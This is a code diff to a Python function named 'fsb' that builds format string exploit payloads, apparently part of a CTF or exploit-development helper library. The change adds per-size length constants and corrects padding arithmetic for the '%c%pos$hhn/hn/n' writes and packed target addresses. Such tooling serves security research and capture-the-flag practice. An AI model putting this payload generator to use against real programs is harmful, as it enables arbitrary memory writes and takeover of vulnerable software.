@@ -18,10 +18,13 @@ def fsb(pos, writes, bs=1, written=0, bits=32):
     # set prefix
     if bs == 1:
         prefix = "hhn"
+        len_data = 3
     elif bs == 2:
         prefix = "hn"
+        len_data = 5
     else:
         prefix = "n"
+        len_data = 10
         
     # craft payload
     payload = b''
@@ -85,12 +88,12 @@ def fsb(pos, writes, bs=1, written=0, bits=32):
             return None
 
         n = written
-        paylen = written + 7 + len(prefix) + len(str(pos))
+        paylen = written + 4 + len_data + len(prefix) + len(str(pos))
         if paylen % 8 != 0:
             paylen += 8 - (paylen % 8)
         pos += paylen // 8
         
-        post_paylen = written + 7 + len(prefix) + len(str(pos))
+        post_paylen = written + 4 + len_data + len(prefix) + len(str(pos))
         if post_paylen % 8 != 0:
             post_paylen += 8 - (post_paylen % 8)
         
@@ -100,14 +103,20 @@ def fsb(pos, writes, bs=1, written=0, bits=32):
         
         if bs == 1:
             l = ((table[1] - n - 1) & 0xff) + 1
+            payload = str2bytes("%{0:03}c%{1}${2}".format(
+                l, pos, prefix
+            ))
         elif bs == 2:
             l = ((table[1] - n - 1) & 0xffff) + 1
+            payload = str2bytes("%{0:05}c%{1}${2}".format(
+                l, pos, prefix
+            ))
         elif bs == 4:
             l = ((table[1] - n - 1) & 0xffffffff) + 1
-        payload = str2bytes("%{0:03}c%{1}${2}".format(
-            l, pos, prefix
-        ))
-        payload += b'A' * (paylen - len(payload))
+            payload = str2bytes("%{0:010}c%{1}${2}".format(
+                l, pos, prefix
+            ))
+        payload += b'A' * (paylen - len(payload) - written)
         payload += p64(table[0]).rstrip(b'\x00')
         
     else:
